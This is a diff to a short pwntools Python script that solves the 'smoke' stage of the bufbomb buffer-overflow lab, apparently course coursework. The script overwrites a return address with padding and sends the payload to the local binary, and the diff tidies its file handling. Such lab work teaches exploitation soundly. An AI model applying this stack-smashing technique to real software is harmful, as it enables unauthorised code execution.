@@ -1,8 +1,7 @@
 from pwn import *
 
-f = open("./ID", "r")
-id = f.read().splitlines()[0]
-f.close()
+with open('./ID', 'r') as f:
+    id = f.read().splitlines()[0]
 
 sh = process(['./bufbomb', '-u', id])
 
@@ -11,7 +10,8 @@ ret = 0x08048c90
 
 exploit = flat(['a' * (length + 12), ret])
 
-print ' '.join(char.encode("hex") for char in exploit)
+with open('./smoke_{}.txt'.format(id), 'w') as f:
+    f.write(' '.join(char.encode('hex') for char in exploit))
 
 sh.sendline(exploit)
 
